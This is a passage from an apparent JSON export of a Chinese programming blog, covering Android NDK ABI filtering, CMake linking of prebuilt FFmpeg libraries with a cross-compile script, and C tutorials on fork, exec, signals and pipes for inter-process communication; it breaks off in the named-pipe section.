cmake交叉编译 abi(application binary interface)abisndk支持的abi包括armeabi，armeabi-v7a，arm64-v8a，x86，x86_64，mips，mips64 NDK 17 不再支持 ABI: armeabi、mips、mips64 x86设备上，libs/x86目录中如果存在.so文件的话，会被安装，如果不存在，则会选择armeabi-v7a中的.so文件，如果也不存在，则选择armeabi目录中的.so文件。 x86设备能够很好的运行ARM类型函数库，但并不保证100%不发生crash，特别是对旧设备。 64位设备（arm64-v8a, x86_64, mips64）能够运行32位的函数库，但是以32位模式运行，在64位平台上运行32位版本的ART和Android组件，将丢失专为64位优化过的性能（ART，webview，media等等）。所有的x86/x86_64/armeabi-v7a/arm64-v8a设备都支持armeabi架构的.so文件，因此似乎移除其他ABIs的.so文件是一个减少APK大小的好技巧。 abiFilter只想让cmake打arm64-v8a一种arch的包怎么办 In most cases, you only need to specify abiFilters in the ndk block, as shown above, because it tells Gradle to both build and package those versions of your native libraries. However, if you want to control what Gradle should build, independently of what you want it to package into your APK, configure another abiFilters flag in the defaultConfig.externalNativeBuild.cmake block (or defaultConfig.externalNativeBuild.ndkBuild block). Gradle builds those ABI configurations but only packages the ones you specify in the defaultConfig.ndk block. 翻译过来就是 android { ... defaultConfig { ... externalNativeBuild { cmake { abiFilters &quot;arm64-v8a&quot; //只帮我打这个架构的就好了 } // or ndkBuild {...} } // Similar to other properties in the defaultConfig block, // you can configure the ndk block for each product flavor // in your build configuration. ndk { // Specifies the ABI configurations of your native // libraries Gradle should build and package with your APK. abiFilters &#39;x86&#39;, &#39;x86_64&#39;, &#39;armeabi&#39;, &#39;armeabi-v7a&#39;, &#39;arm64-v8a&#39; //这些架构的包我全部都要打进apk里面 //当然，如果 externalNativeBuild里面只打了arm64-v8a的so文件，这种写法导致最终生成的apk里面装了x86，x86_64..的so文件夹，但其实里面放的都是arm64-v8a的so，当然是不行的。 //默认情况下，不写abiFilter的话，所有支持的abi对应的so文件都会打出来，大小略有差异 } } buildTypes {...} // Use this block to link Gradle to your CMake or ndk-build script.似乎只是用来告诉gradle CMakeList.txt的位置在哪里 externalNativeBuild { cmake { path &#39;CMakeLists.txt&#39; //这个是说明CMakeLists.txt这个文件在哪里的，studio 里面link project with c++ program就是干这个的 } } } 所以现在看来这种手动调用cmake的方式也没有太大必要了 abi支持缺失导致的crashandroid第三方 sdk是以aar形式提供的,甚至是远程aar，如果这个sdk对abi的支持比较全，可能会包含armeabi, armeabi-v7a,x86, arm64-v8a,x86_64五种abi,而你应用的其它so只支持armeabi,armeabi-v7a，x86三种，直接引用sdk的aar,会自动编译出支持5种abi的包。但是应用的其它so缺少对其它两种abi的支持，那么如果应用运行于arm64-v8a,x86_64为首选abi的设备上时，就会CRASH。所以解决方法就分两种第一种： productFlavors { necess { ndk { abiFilters &quot;armeabi-v7a&quot; abiFilters &quot;x86&quot; abiFilters &quot;armeabi&quot; } } abiall { ndk { abiFilters &quot;armeabi-v7a&quot; abiFilters &quot;x86&quot; abiFilters &quot;armeabi&quot; abiFilters &quot;arm64-v8a&quot; abiFilters &quot;x86_64&quot; } } } 第二种：app/build.gradle中这句话的意思是指让生成的apk中包含下面三种abi的so文件 defaultConfig { ndk { abiFilters &quot;armeabi&quot;, &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot; } } 在apk文件中，so文件放在lib/armeabi-v7a lib/x86_64 lib/x86 lib/arm64-v8a这些文件夹下面 添加prebuilt libraryAdd other prebuilt libraries在CMakeLists.txt中添加add_library( imported-lib SHARED IMPORTED )关键词IMPORTED ，就拿ffmepg来说，首先在linux上编译出不同abi的so文件，ffmpeg有好几个so文件，比方说libavcodec.so这个文件。 Some libraries provide separate packages for specific CPU architectures, or Application Binary Interfaces (ABI), and organize them into separate directories. This approach helps libraries take advantage of certain CPU architectures while allowing you to use only the versions of the library you want. To add multiple ABI versions of a library to your CMake build script, without having to write multiple commands for each version of the library, you can use the ANDROID_ABI path variable. This variable uses a list of the default ABIs that the NDK supports, or a filtered list of ABIs you manually configure Gradle to use. 有些第三方库针对不同的cpu架构提供了不同的so文件 # 添加库——外部引入的库 # 库名称：avcodec（不需要包含前缀lib） # 库类型：SHARED，表示动态库，后缀为.so（如果是STATIC，则表示静态库，后缀为.a） # IMPORTED表明是外部引入的库 set(distribution_DIR ../../../../libs) //这个libs文件夹名字随便取，下面要包含armeabi-v7a,x86,x86_64等你想要支持的架构对应的so文件（在Linux上编出来的） add_library( avcodec SHARED IMPORTED) set_target_properties( avcodec PROPERTIES IMPORTED_LOCATION ${distribution_DIR}/${ANDROID_ABI}/libavcodec.so) //最终gradle编译的时候会把abiFilter中指定的cpu架构一个个去对应的文件夹去找so文件，找不到就会报错 include_directories( avcodec/include/ ) //告诉cmake，把这个目录下面的文件当做头文件拿进来，不用自己一个个去copy了，注意这个不是recursive的，也就是照顾不到子文件夹 //这一步就是Link了 target_link_libraries( native-lib //这个是我们自己的lib的名字 avcodec avfilter avformat avutil swresample swscale -landroid ${log-lib} ) 预先编译好的so文件放置的目录要告诉gradle f you want Gradle to package prebuilt native libraries with your APK, modify the default source set configuration to include the directory of your prebuilt .so files, as shown below. Keep in mind, you don’t need to do this to include artifacts of CMake build scripts that you link to Gradle. android { ... sourceSets { main { jniLibs.srcDirs &#39;imported-lib/src/&#39;, &#39;more-imported-libs/src/&#39; } } } 调用ndk的api比方说这种头文件 #include &lt;android/native_window_jni.h&gt; #include &lt;android/cpu-features.h&gt; #include &lt;android/multinetwork.h&gt; native_window_jni 在ndk 的libandroid.so库中，需要在CMakeLists.txt中引入android库，像这样 target_link_libraries( my-lib ... -landroid ${log-lib} ) 从fmpeg+native_window实现万能视频播放器播放本地视频抄来一段cpp代码 extern &quot;C&quot; { //编码 #include &quot;libavcodec/avcodec.h&quot; //封装格式处理 #include &quot;libavformat/avformat.h&quot; //像素处理 #include &quot;libswscale/swscale.h&quot; //native_window_jni 在ndk 的libandroid.so库中，需要在CMakeLists.txt中引入android库 #include &lt;android/native_window_jni.h&gt; #include &lt;unistd.h&gt;//sleep用的头文件 } /** *将任意格式的视频在手机上进行播放，使用native进行绘制 * env:虚拟机指针 * inputStr：视频文件路径 * surface: 从java层传递过来的SurfaceView的surface对象 */ void ffmpegVideoPlayer(JNIEnv *env, char *inputStr, jobject surface) { // 1.注册各大组件，执行ffmgpe都必须调用此函数 av_register_all(); //2.得到一个ffmpeg的上下文（上下文里面封装了视频的比特率，分辨率等等信息...非常重要） AVFormatContext *pContext = avformat_alloc_context(); //3.打开一个视频 if (avformat_open_input(&amp;pContext, inputStr, NULL, NULL) &lt; 0) { LOGE(&quot;打开失败&quot;); return; } //4.获取视频信息（将视频信息封装到上下文中） if (avformat_find_stream_info(pContext, NULL) &lt; 0) { LOGE(&quot;获取信息失败&quot;); return; } //5.用来记住视频流的索引 int video_stream_idx = -1; //从上下文中寻找找到视频流 for (int i = 0; i &lt; pContext-&gt;nb_streams; ++i) { LOGE(&quot;循环 %d&quot;, i); //codec：每一个流 对应的解码上下文 //codec_type：流的类型 if (pContext-&gt;streams[i]-&gt;codec-&gt;codec_type == AVMEDIA_TYPE_VIDEO) { //如果找到的流类型 == AVMEDIA_TYPE_VIDEO 即视频流，就将其索引保存下来 video_stream_idx = i; } } //获取到解码器上下文 AVCodecContext *pCodecCtx = pContext-&gt;streams[video_stream_idx]-&gt;codec; //获取解码器（加密视频就是在此处无法获取） AVCodec *pCodex = avcodec_find_decoder(pCodecCtx-&gt;codec_id); LOGE(&quot;获取视频编码 %p&quot;, pCodex); //6.打开解码器。 （ffempg版本升级名字叫做avcodec_open2） if (avcodec_open2(pCodecCtx, pCodex, NULL) &lt; 0) { LOGE(&quot;解码失败&quot;); return; } //----------------------解码前准备-------------------------------------- //准备开始解码时需要一个AVPacket存储数据（通过av_malloc分配内存） AVPacket *packet = (AVPacket *) av_malloc(sizeof(AVPacket)); av_init_packet(packet);//初始化结构体 //解封装需要AVFrame AVFrame *frame = av_frame_alloc(); //声明一个rgb_Frame的缓冲区 AVFrame *rgb_Frame = av_frame_alloc(); //rgb_Frame 的缓冲区 初始化 uint8_t *out_buffer = (uint8_t *) av_malloc( avpicture_get_size(AV_PIX_FMT_RGBA, pCodecCtx-&gt;width, pCodecCtx-&gt;height)); //给缓冲区进行替换 int re = avpicture_fill((AVPicture *) rgb_Frame, out_buffer, AV_PIX_FMT_RGBA, pCodecCtx-&gt;width, pCodecCtx-&gt;height); LOGE(&quot;宽 %d 高 %d&quot;, pCodecCtx-&gt;width, pCodecCtx-&gt;height); //格式转码需要的转换上下文（根据封装格式的宽高和编码格式，以及需要得到的格式的宽高） //pCodecCtx-&gt;pix_fmt 封装格式文件的上下文 //AV_PIX_FMT_RGBA ： 目标格式 需要跟SurfaceView设定的格式相同 //SWS_BICUBIC ：清晰度稍微低一点的算法（转换算法，前面的算法清晰度高效率低，下面的算法清晰度低效率高） //NULL,NULL,NULL ： 过滤器等 SwsContext *swsContext = sws_getContext(pCodecCtx-&gt;width, pCodecCtx-&gt;height, pCodecCtx-&gt;pix_fmt, pCodecCtx-&gt;width, pCodecCtx-&gt;height, AV_PIX_FMT_RGBA, SWS_BICUBIC, NULL, NULL, NULL ); int frameCount = 0; //获取nativeWindow对象,准备进行绘制 ANativeWindow *nativeWindow = ANativeWindow_fromSurface(env, surface); ANativeWindow_Buffer outBuffer;//申明一块缓冲区 用于绘制 //------------------------一桢一帧开始解码-------------------- int length = 0; int got_frame; while (av_read_frame(pContext, packet) &gt;= 0) {//开始读每一帧的数据 if (packet-&gt;stream_index == video_stream_idx) {//如果这是一个视频流 //7.解封装（将packet解压给frame，即：拿到了视频数据frame） length = avcodec_decode_video2(pCodecCtx, frame, &amp;got_frame, packet);//解封装函数 LOGE(&quot; 获得长度 %d 解码%d &quot;, length, frameCount++); if (got_frame &gt; 0) { //8.准备绘制 //配置绘制信息 宽高 格式(这个绘制的宽高直接决定了视频在屏幕上显示的情况，这样会平铺整个屏幕，可以根据特定的屏幕分辨率和视频宽高进行匹配) ANativeWindow_setBuffersGeometry(nativeWindow, pCodecCtx-&gt;width, pCodecCtx-&gt;height, WINDOW_FORMAT_RGBA_8888); ANativeWindow_lock(nativeWindow, &amp;outBuffer, NULL);//锁定画布(outBuffer中将会得到数据) //9.转码（转码上下文，原数据，一行数据，开始位置，yuv的缓冲数组，yuv一行的数据） sws_scale(swsContext, (const uint8_t *const *) frame-&gt;data, frame-&gt;linesize, 0, frame-&gt;height, rgb_Frame-&gt;data, rgb_Frame-&gt;linesize ); //10.绘制 uint8_t *dst = (uint8_t *) outBuffer.bits; //实际的位数 int destStride = outBuffer.stride * 4; //拿到一行有多少个字节 RGBA uint8_t *src = (uint8_t *) rgb_Frame-&gt;data[0];//像素数据的首地址 int srcStride = rgb_Frame-&gt;linesize[0]; //实际内存一行的数量 for (int i = 0; i &lt; pCodecCtx-&gt;height; ++i) { //将rgb_Frame缓冲区里面的数据一行一行copy到window的缓冲区里面 //copy到window缓冲区的时候进行一些偏移设置可以将视频播放居中 memcpy(dst + i * destStride, src + i * srcStride, srcStride); } ANativeWindow_unlockAndPost(nativeWindow);//解锁画布 usleep(1000 * 16);//可以根据帧率休眠16ms } } av_free_packet(packet);//释放 } ANativeWindow_release(nativeWindow);//释放window av_frame_free(&amp;frame); av_frame_free(&amp;rgb_Frame); avcodec_close(pCodecCtx); avformat_free_context(pContext); free(inputStr); } ffmpeg移植到Android上（多个abi）首先是编译不同架构的ffmpeg library这个库使用了FFmpeg 3.4 和 NDK r16b stable. 版本搭配真的很重要，这个脚本还要调用python创建不同abi的toolchain。使用ndk编译ffmpeg满满的都是坑 In file included from libavfilter/aeval.c:26:0: ./libavutil/avassert.h:30:20: fatal error: stdlib.h: No such file or directory #include &lt;stdlib.h&gt; ^ 出现这个错误是因为使用最新版的NDK造成的，最新版的NDk将头文件和库文件进行了分离，我们指定的sysroot文件夹下只有库文件，而头文件放在了NDK目录下的sysroot内，只需在--extra-cflags中添加 &quot;-isysroot $NDK/sysroot&quot; 即可，还有有关汇编的头文件也进行了分离，需要根据目标平台进行指定 &quot;-I$NDK/sysroot/usr/include/arm-linux-androideabi&quot;，将 &quot;arm-linux-androideabi&quot; 改为需要的平台就可以，终于可以顺利的进行编译了 nasm/yasm not found or too old. use --disable-x86asm for a crippled build 这是汇编工具没有安装导致的sudo apt install yasm 找到一个编译不同abi的so文件的脚本armeabi-v7a arm64-v8a x86 x86_64这么几个host每个都要花上10分钟，所以这个脚本跑起来之后可以去喝杯茶了 #!/bin/sh PREFIX=android-build HOST_PLATFORM=linux-x86_64 COMMON_OPTIONS=&quot;\\ --target-os=android \\ --disable-static \\ --enable-shared \\ --enable-small \\ --disable-programs \\ --disable-ffmpeg \\ --disable-ffplay \\ --disable-ffprobe \\ --disable-doc \\ --disable-symver \\ --disable-asm \\ --enable-decoder=vorbis \\ --enable-decoder=opus \\ --enable-decoder=flac &quot; build_all(){ for version in armeabi-v7a arm64-v8a x86 x86_64; do echo &quot;======== &gt; Start build $version&quot; case ${version} in armeabi-v7a ) ARCH=&quot;arm&quot; CPU=&quot;armv7-a&quot; CROSS_PREFIX=&quot;$NDK_HOME/toolchains/arm-linux-androideabi-4.9/prebuilt/$HOST_PLATFORM/bin/arm-linux-androideabi-&quot; SYSROOT=&quot;$NDK_HOME/platforms/android-21/arch-arm/&quot; EXTRA_CFLAGS=&quot;-march=armv7-a -mfpu=neon -mfloat-abi=softfp -mvectorize-with-neon-quad&quot; EXTRA_LDFLAGS=&quot;-Wl,--fix-cortex-a8&quot; ;; arm64-v8a ) ARCH=&quot;aarch64&quot; CPU=&quot;armv8-a&quot; CROSS_PREFIX=&quot;$NDK_HOME/toolchains/aarch64-linux-android-4.9/prebuilt/$HOST_PLATFORM/bin/aarch64-linux-android-&quot; SYSROOT=&quot;$NDK_HOME/platforms/android-21/arch-arm64/&quot; EXTRA_CFLAGS=&quot;&quot; EXTRA_LDFLAGS=&quot;&quot; ;; x86 ) ARCH=&quot;x86&quot; CPU=&quot;i686&quot; CROSS_PREFIX=&quot;$NDK_HOME/toolchains/x86-4.9/prebuilt/$HOST_PLATFORM/bin/i686-linux-android-&quot; SYSROOT=&quot;$NDK_HOME/platforms/android-21/arch-x86/&quot; EXTRA_CFLAGS=&quot;&quot; EXTRA_LDFLAGS=&quot;&quot; ;; x86_64 ) ARCH=&quot;x86_64&quot; CPU=&quot;x86_64&quot; CROSS_PREFIX=&quot;$NDK_HOME/toolchains/x86_64-4.9/prebuilt/$HOST_PLATFORM/bin/x86_64-linux-android-&quot; SYSROOT=&quot;$NDK_HOME/platforms/android-21/arch-x86_64/&quot; EXTRA_CFLAGS=&quot;&quot; EXTRA_LDFLAGS=&quot;&quot; ;; esac echo &quot;-------- &gt; Start clean workspace&quot; make clean echo &quot;-------- &gt; Start config makefile&quot; configuration=&quot;\\ --prefix=${PREFIX} \\ --libdir=${PREFIX}/libs/${version} --incdir=${PREFIX}/includes/${version} \\ --pkgconfigdir=${PREFIX}/pkgconfig/${version} \\ --arch=${ARCH} \\ --cpu=${CPU} \\ --cross-prefix=${CROSS_PREFIX} \\ --sysroot=${SYSROOT} \\ --extra-ldexeflags=-pie \\ ${COMMON_OPTIONS} &quot; echo &quot;-------- &gt; Start config makefile with ${configuration}&quot; ./configure ${configuration} echo &quot;-------- &gt; Start make ${version} with -j8&quot; make j8 echo &quot;-------- &gt; Start install ${version}&quot; make install echo &quot;++++++++ &gt; make and install ${version} complete.&quot; done } echo &quot;-------- Start --------&quot; build_all echo &quot;-------- End --------&quot; 如何把ffmpeg生成的so文件压缩大小 然后才是交叉编译 参考configure-cmakegooglesamples/android-ndkAndroid NDK开发扫盲及最新CMake的编译使用","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"C语言中多进程之间通信的方式","date":"2019-01-30T07:57:28.000Z","path":"2019/01/30/2019-01-30-ipc-in-c-programming-language/","text":"进程是资源分配的最小单位，线程是CPU调度的最小单位 本文多数来自c语言多进程编程 当Linux启动的时候，init是系统创建的第一个进程，这一进程会一直存在，直到我们关闭计算机；虽然后面systemd取代了init进程。后面的所有进程都是init进程fork出来的,linux下使用pstree可以看到所有的进程都是以systemd为根节点的当进程调用fork的时候，Linux在内存中开辟出一片新的内存空间给新的进程，并将老的进程空间中的内容复制到新的空间中，此后两个进程同时运行；老进程成为新进程的父进程(parent process)，而相应的，新进程就是老进程的子进程(child process)； fork的最简单实例fork是系统调用，会有两次返回，分别是父进程和子进程。 #include &lt;stdint.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; void print_process_message(){ __pid_t myprocess_id = getpid(); __uid_t uid = getuid(); __gid_t ugid = getgid(); printf(&quot;getpid = %d getuid= %d getgid= %d \\n&quot;,myprocess_id,uid, ugid); } int main(int argc, char const *argv[]) { int n =0; printf(&quot;before fork: n = %d\\n&quot;,n); __pid_t fpid =fork(); if(fpid &lt;0 ) { perror(&quot;fork error&quot;); exit(EXIT_FAILURE); }else if (fpid == 0) { n++; printf(&quot;child_proc(%d, ppid=%d): n= %d\\n&quot;,getpid(),getppid(),n); } else { n--; printf(&quot;parent_proc(%d): n= %d\\n&quot;,getpid(),n); } print_process_message(); printf(&quot;quit_proc(%d) ...\\n&quot;,getpid()); return 0; } fork和vfrokfork创建子进程，把父进程数据空间、堆和栈复制一份；vfork创建子进程，与父进程内存数据共享；但是后来的fork也学聪明了，不是一开始调用fork就复制数据，而是只有在子进程要修改数据的时候，才进行复制，即copy-on-write；所以我们现在也很少去用vfork，因为vfork的优势已经不复存在了； 孤儿进程和僵尸进程以及wait正常的操作流程：子进程终结时会通知父进程，并通过return code告诉内核自己的退出信息，父进程知道后，有责任对该子进程使用wait系统调用，这个wait函数能够从内核中取出子进程的退出信息，并清空该信息在内核中所占据的空间； 不正常的流程：父进程早于子进程挂掉，那么子进程就成了孤儿进程 如果程序写的糟糕，父进程忘记对子进程调用wait，子进程就成为僵尸(zombie)进程。（在htop里面看到state是Z）当进程退出，释放大多数资源和它的父进程收集它的返回值、释放剩余资源这两段时间之间，子进程处于一个特殊状态，被称为僵尸进程；每个进程都会经过一个短暂的僵尸状态，僵尸进程的最大危害就是会占用宝贵的PID资源，如果不及时清理，会导致无法再创建新的进程； 解决僵尸进程的方法是干掉僵尸进程的父进程，僵尸进程也就变成了孤儿进程，最终被init进程接管，init进程会负责wait这些孤儿进程，释放占用的资源。 wait和waitpid函数pid_t wait(int status);：等待任意子进程退出，并捕获退出状态pid_t waitpid(pid_t pid, int status, int options);：等待子进程退出，并捕获退出状态这两个函数返回的都是退出的子进程的id #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;wait.h&gt; int main(int argc, char const *argv[],char *envp[]) { pid_t fpid = fork(), pid; if(fpid &lt; 0) { perror(&quot;fork error&quot;); exit(EXIT_FAILURE); } else if(fpid ==0 ) { sleep(5); exit(5); } else { int stat; for(;;){ pid = waitpid(fpid,&amp;stat,WNOHANG); //stat用于记录子进程的返回结果 if(pid&gt;0) { break; }else { printf(&quot;wait child proc ... \\n&quot;); sleep(1); } } if(WIFEXITED(stat))//这个函数如果子进程正常退出的话就返回真 { printf(&quot;child_proc(%d): exit_code :%d\\n&quot;,pid,WEXITSTATUS(stat)); } } return 0; } 处理子进程的退出有以下两种方式：第一种：通过信号处理函数signal()，如可以忽略子进程的SIGCHLD信号来防止僵尸进程的产生：signal(SIGCHLD, SIG_IGN);第二种：通过调用wait()、waitpid()函数，来回收子进程，防止产生僵尸进程，占用PID等宝贵的系统资源； 经常在parent process中看到wait(NULL)的操作，意思就是让父进程等child process 返回exit status。wait(NULL)是什么意思 wait(NULL) will block parent process until any of its children has finished. If child terminates before parent process reaches wait(NULL) then the child process turns to a zombie process until its parent waits on it and its released from memory. If parent process doesn&#39;t wait for its child, and parent finishes first, then the child process becomes orphan and is assigned to init as its child. And init will wait and release the process entry in the process table. In other words: parent process will be blocked until child process returns an exit status to the operating system which is then returned to parent process. If child finishes before parent reaches wait(NULL) then it will read the exit status, release the process entry in the process table and continue execution until it finishes as well. exec系列函数fork出来一个新的进程当然是要干活的，就要用到exec系统调用exec系统调用是以新的进程空间替换现在的进程空间，但是pid不变，还是原来的pid，相当于换了个身体，但是名字不变；调用exec后，系统会申请一块新的进程空间来存放被调用的程序，然后当前进程会携带pid跳转到新的进程空间，并从main函数开始执行，旧的进程空间被回收；exec用被执行的程序完全替换调用它的程序的影像。fork创建一个新的进程就产生了一个新的PID，exec启动一个新程序，替换原有的进程，因此这个新的被exec执行的进程的PID不会改变， #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; int main(int arg,char **args) { char *argv[]={&quot;ls&quot;,&quot;-al&quot;,&quot;/usr/include/linux&quot;,NULL};//传递给执行文件的参数数组，这里包含执行文件的参数 char *envp[]={0,NULL};//传递给执行文件新的环境变量数组 execve(&quot;/bin/ls&quot;,argv,envp); } 这个函数的参数 int execve( char *pathname,char *argv[],char *envp[]) exit(可以注册进程退出的时候的回调函数)exit是系统调用级别的，用于进程运行的过程中，随时结束进程；return是语言级别的，用于调用堆栈的返回，返回上一层调用；在main函数中调用exit(0)等价于return 0；_exit()函数的作用最为简单：直接使进程停止运行，清除其使用的内存空间，并销毁其在内核中的各种数据结构；exit()函数则在这些基础上作了一些包装，在执行退出之前加了若干道工序；exit()函数与_exit()函数最大的区别就在于exit()要检查文件的打开情况，把文件缓冲区中的内容写回文件，就是”清理I/O缓冲”； 按照ANSI C的规定，一个进程可以登记至多32个函数，这些函数将由exit自动调用；（也就是说在调用exit的时候会调用这些回调函数）分为atexit和on_exit #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;signal.h&gt; void func1(void){ printf(&quot;&lt;atexit&gt; func1 getpid = %d \\n&quot;,getpid()); } void func2(void){ printf(&quot;&lt;atexit&gt; func2 getpid = %d \\n&quot;,getpid()); } void func3(void){ printf(&quot;&lt;atexit&gt; func3 getpid = %d \\n&quot;,getpid()); } void func(int status, void *str){ printf(&quot;&lt;on_exit&gt; exit_code: %d, arg: %s getpid = %d \\n&quot;, status, (char *)str,getpid()); } int main(void){ signal(SIGCHLD, SIG_IGN); on_exit(func, &quot;on_exit3&quot;); on_exit(func, &quot;on_exit2&quot;); on_exit(func, &quot;on_exit1&quot;); atexit(func3); atexit(func2); atexit(func1); pid_t pid; pid = fork(); if(pid &lt; 0){ perror(&quot;fork error&quot;); exit(EXIT_FAILURE); }else if(pid == 0){ exit(0); }else{ sleep(3); } return 0; } 输出： &lt;atexit&gt; func1 getpid = 13508 &lt;atexit&gt; func2 getpid = 13508 &lt;atexit&gt; func3 getpid = 13508 &lt;on_exit&gt; exit_code: 0, arg: on_exit1 getpid = 13508 &lt;on_exit&gt; exit_code: 0, arg: on_exit2 getpid = 13508 &lt;on_exit&gt; exit_code: 0, arg: on_exit3 getpid = 13508 &lt;atexit&gt; func1 getpid = 13507 &lt;atexit&gt; func2 getpid = 13507 &lt;atexit&gt; func3 getpid = 13507 &lt;on_exit&gt; exit_code: 0, arg: on_exit1 getpid = 13507 &lt;on_exit&gt; exit_code: 0, arg: on_exit2 getpid = 13507 也就是说fork出来的子进程会继承父进程的终止处理函数、信号处理设置； Daemon守护进程Linux Daemon进程是运行在后台的一种特殊进程。一个守护进程的父进程是init进程，因为它真正的父进程在fork出子进程后就先于子进程exit退出了，所以它是一个由init继承的孤儿进程；守护进程是非交互式程序，没有控制终端，所以任何输出，无论是向标准输出设备stdout还是标准出错设备stderr的输出都需要特殊处理；守护进程的名称通常以d结尾，比如sshd、xinetd、crond等； 头文件：unistd.hint daemon(int nochdir, int noclose); system和popensystem是去执行一个shell命令system()函数调用/bin/sh来执行参数指定的命令，/bin/sh一般是一个软连接，指向某个具体的shell，比如bash； system(&quot;cat /etc/sysctl.conf&quot;);； 实际上system()函数执行了三步操作：fork一个子进程；在子进程中调用exec函数去执行command；在父进程中调用wait去等待子进程结束；一个不好的地方是system()，并不能获取命令执行的输出结果，只能得到执行的返回值； popen标准I/O函数库提供了popen函数，它启动另外一个进程去执行一个shell命令行；这里我们称调用popen的进程为父进程，由popen启动的进程称为子进程； popen函数还创建一个管道用于父子进程间通信；父进程要么从管道读信息，要么向管道写信息，至于是读还是写取决于父进程调用popen时传递的参数； #include &lt;stdio.h&gt; FILE *popen(const char *command, const char *type); /* 函数功能：popen()会调用fork()产生子进程，然后从子进程中调用/bin/sh -c来执行参数command的指令; 参数type可使用&quot;r&quot;代表读取，&quot;w&quot;代表写入; 依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针; 随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中; 返回值：若成功则返回文件指针，否则返回NULL，错误原因存于errno中 */ int pclose(FILE *stream); /* 函数功能：pclose()用来关闭由popen所建立的管道及文件指针；参数stream为先前由popen()所返回的文件指针; 返回值：若成功则返回shell的终止状态(也即子进程的终止状态)，若出错返回-1，错误原因存于errno中; */ 这里正式使用到了进程之间的管道通信 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; int main(int argc, char *argv[]){ if(argc &lt; 2){ fprintf(stderr, &quot;usage: %s &lt;cmd&gt;\\n&quot;, argv[0]); exit(EXIT_FAILURE); } char output[1024+1]; FILE *pp = popen(argv[1], &quot;r&quot;); if(pp == NULL){ perror(&quot;popen error&quot;); exit(EXIT_FAILURE); } int nread = fread(output, 1, 1024, pp); //父进程通过文件指针读取子进程的输出设备。 int status = pclose(pp); if(status &lt; 0){ perror(&quot;pclose error&quot;); exit(EXIT_FAILURE); } output[nread] = &#39;\\0&#39;; if(WIFEXITED(status)){ printf(&quot;status: %d\\n%s&quot;, WEXITSTATUS(status), output); } return 0; } signal信号信号(signal)是一种软中断，信号机制是进程间通信的一种方式，采用异步通信方式用kill -l 可以查看可以发出的信号 $ kill -l HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM 16 CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL 30 SYS 挑几个重要的:SIGINT(2) 中断 （CTRL + C）SIGKILL(9) kill信号（强杀，进程不能阻止）SIGPIPE(13) 管道破损，没有读端的管道写数据,就是那个brokenpipe。默认是杀进程的，所以网络编程中要处理这个信号。（当服务器close一个连接时，若client端接着发数据。根据TCP协议的规定，会收到一个RST响应，client再往这个服务器发送数据时，系统会发出一个SIGPIPE信号给进程，告诉进程这个连接已经断开了，不要再写了。）SIGTERM（１５） 终止信号，这个不是强制的，它可以被捕获和解释（或忽略）的过程。类似于和这个进程商量一下，让它退出。不听话的话可以用９杀掉。SIGCHLD(１７) 子进程退出。 默认忽略SIGSTOP（１９） 进程停止 不能被忽略、处理和阻塞SIGPWR(30) 关机 默认忽略进程可以注册收到信号时的处理函数 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; #include &lt;unistd.h&gt; void handle_signal(int signum){ printf(&quot;received signal: %d\\n&quot;, signum); exit(0); } int main(void){ signal(SIGINT, handle_signal); for(;;){ printf(&quot;running ... \\n&quot;); sleep(1); } return 0; } 这里添一句，cpython因为是用Ｃ语言写的，在处理信号这方面几乎是一模一样。注册signal_handler ＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝介绍进程的基础知识到此结束 进程之间的通信使用管道管道是FIFO的下面是创建一个匿名管道的代码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; int main(int argc, char *argv[]){ if(argc &lt; 3){ fprintf(stderr, &quot;usage: %s parent_sendmsg child_sendmsg\\n&quot;, argv[0]); exit(EXIT_FAILURE); } int pipes[2]; if(pipe(pipes) &lt; 0){ perror(&quot;pipe&quot;); exit(EXIT_FAILURE); } pid_t pid = fork(); if(pid &lt; 0){ perror(&quot;fork&quot;); exit(EXIT_FAILURE); }else if(pid &gt; 0){ char buf[BUFSIZ + 1]; int nbuf; strcpy(buf, argv[1]); write(pipes[1], buf, strlen(buf)); sleep(1); //这里sleep是为了让子进程有时间把管道中的数据读走，不然数据就会被底下的父进程的read读走. //因为实质上内核中只有一个管道缓冲区，是父进程创建的，只不过子进程同时拥有了它的引用 nbuf = read(pipes[0], buf, BUFSIZ); buf[nbuf] = 0; printf(&quot;parent_proc(%d) recv_from_child: %s\\n&quot;, getpid(), buf); close(pipes[0]); close(pipes[1]); }else if(pid == 0){ char buf[BUFSIZ + 1]; int nbuf = read(pipes[0], buf, BUFSIZ); buf[nbuf] = 0; printf(&quot;child_proc(%d) recv_from_parent: %s\\n&quot;, getpid(), buf); strcpy(buf, argv[2]); write(pipes[1], buf, strlen(buf)); close(pipes[0]); close(pipes[1]); } return 0; } ./a.out parent_say_tochild child_say_to_parent 实际中为了实现双向通信，应该准备两根管道，一根负责从父进程往子进程写数据（同时子进程从这里读取数据），一根负责从子进程往父进程写数据（父进程也从这里读数据） 管道默认是阻塞模式的，fcntl(fd, F_SETFL, flags | O_NONBLOCK);可以设置非阻塞的管道，这个跟socket很像。 命名管道上面说的匿名管道要求这些进程都是由同一个祖先创建的。所以在不相干的进程之间交换数据就不方便了，为此，我们需要命名管道命名管道也被称为FIFO文件我们可以使用以下两个函数之一来创建一个命名管道，原型如下： 头文件：sys/types.h、sys/stat.h int mkfifo(const char *filename, mode_t mode); int mknod(const char 